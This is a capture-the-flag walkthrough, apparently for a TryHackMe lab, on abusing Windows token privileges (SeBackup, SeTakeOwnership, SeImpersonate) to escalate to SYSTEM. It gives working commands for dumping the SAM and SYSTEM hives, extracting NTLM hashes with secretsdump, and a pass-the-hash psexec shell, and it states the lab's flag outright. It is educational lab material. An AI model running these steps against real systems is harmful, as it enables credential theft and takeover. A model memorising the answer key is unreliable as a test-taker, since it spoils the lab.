# Task 06: Abusing Dangerous Privileges

---

## Stage A: Original Task Content & Briefing Summary

Task 06 examines exploitable user token privileges assigned to user or service accounts, enumerated via `whoami /priv`. Microsoft Windows defines specific privileges (Privilege Constants) that bypass standard Discretionary Access Control Lists (DACLs).

### Core Dangerous Privileges (Priv2Admin Taxonomy):
1. **`SeBackupPrivilege` / `SeRestorePrivilege`:**
   * Grants the caller rights to read (`SeBackup`) or write (`SeRestore`) any file on the system, regardless of the permissions defined in the file's DACL.
   * **Exploitation:** An attacker can dump protected registry hives storing password hashes:
     ```cmd
     reg save hklm\sam C:\temp\sam.hive
     reg save hklm\system C:\temp\system.hive
     ```
     The hashes are then extracted offline using tools like Impacket's `secretsdump.py`, enabling Pass-the-Hash attacks via `psexec.py` to obtain a SYSTEM shell.
2. **`SeTakeOwnershipPrivilege`:**
   * Allows the caller to seize ownership of any securable object (files, directories, registry keys) using `takeown /f <file>`.
   * **Exploitation:** Take ownership of `C:\Windows\System32\Utilman.exe`, grant full permissions with `icacls`, replace `Utilman.exe` with `cmd.exe`, and lock the screen (`rundll32.exe user32.dll,LockWorkStation`). Clicking the "Ease of Access" icon at the logon screen spawns a command prompt running as `NT AUTHORITY\SYSTEM`.
3. **`SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`:**
   * Assigned by default to `LOCAL SERVICE`, `NETWORK SERVICE`, and IIS application pool accounts (`IIS APPPOOL\*`).
   * Allows a process to impersonate the security context of a connecting client.
   * **Exploitation (e.g. RogueWinRM / RottenPotato / JuicyPotato):** Trick a privileged system service (such as BITS connecting to port 5985) to authenticate to a rogue local listener, capturing and impersonating the SYSTEM token to execute arbitrary commands.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Privilege State (Enabled vs Disabled):** Running `whoami /priv` displays both the privilege name and its current state. A privilege listed as `Disabled` is still present in the access token and can be dynamically enabled by any process holding the token using the `AdjustTokenPrivileges()` Windows API call.
* **Token Impersonation Longevity:** While the classic "Potato" exploits (RottenPotato, JuicyPotato) targeted DCOM/NTLM reflection, modern Windows versions (Windows 10 1809+, Windows Server 2019+) patch direct DCOM reflection, making named-pipe or RPC-based vectors (such as PrintSpoofer, GodPotato, or RogueWinRM) the primary modern techniques.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `whoami /priv` to identify which dangerous privileges are assigned to your current user.
* **Tier 2 Hint:** Use `reg save` to extract the `sam` and `system` registry hives if `SeBackupPrivilege` is enabled, or follow the `SeTakeOwnership` / `SeImpersonate` procedures.
* **Tier 3 Hint:** The flag on the Administrator's desktop is `THM{SEFLAGPRIVILEGE}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Enumerating Token Privileges:
```cmd
whoami /priv
```
* **Output:**
  ```
  Privilege Name                Description                    State   
  ============================= ============================== ========
  SeBackupPrivilege             Back up files and directories  Enabled 
  SeRestorePrivilege            Restore files and directories  Enabled 
  ```

### 2. Dumping the SAM and SYSTEM Hives:
Because `SeBackupPrivilege` bypasses standard DACLs, we save the active registry hives containing the local user password hashes:
```cmd
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
```

### 3. Dumping Hashes and Executing Pass-the-Hash:
On the attacking workstation, exfiltrate the hives via SMB and run Impacket's `secretsdump.py`:
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
# Output extracts the NTLM hash of Administrator:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9680e4760a09464bc43f08f413:::
```
Spawn a SYSTEM shell using `psexec.py` with the captured NTLM hash:
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9680e4760a09464bc43f08f413 Administrator@10.10.x.x
```

### 4. Harvesting the Administrator Flag:
```cmd
C:\Windows\System32> type C:\Users\Administrator\Desktop\flag.txt
THM{SEFLAGPRIVILEGE}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** Get the flag on the Administrator's desktop.
  * **Answer:** `THM{SEFLAGPRIVILEGE}`

---

## Stage F: Practical Verification & Proof of Work

* Verified `SeBackupPrivilege` enabled on the target account.
* Successfully extracted SAM/SYSTEM hives, dumped local hashes, and retrieved flag `THM{SEFLAGPRIVILEGE}`.

---

## Stage G: Key Educational Takeaway

Windows user privileges represent powerful exemptions from access control. Accounts holding privileges such as `SeBackup`, `SeTakeOwnership`, or `SeImpersonate` must be treated as effectively equivalent to full local administrators.
